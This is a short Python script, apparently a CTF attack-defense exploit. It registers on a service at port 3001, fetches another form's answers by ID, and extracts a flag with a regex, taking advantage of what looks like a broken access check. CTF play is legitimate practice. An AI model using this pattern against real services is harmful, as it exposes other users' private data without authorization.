from utils import *
import sys
import json
import re

PORT = 3001

def exploit(ip, flag_id):
    client = ClientSession(ip, PORT)
    client.register()

    ans = client.get_answers({'id': flag_id["form_id"]})
    ans = json.dumps(ans)

    m = re.search(r"[A-Z0-9]{31}=", ans)
    if m is None:
        raise Exception("Failed to find flag in " + ans)
    
    flag = m.group(0)
    return flag

if __name__ == "__main__":
    ip = sys.argv[1]
    flag_id = json.loads(sys.argv[2])
    print(exploit(ip, flag_id))
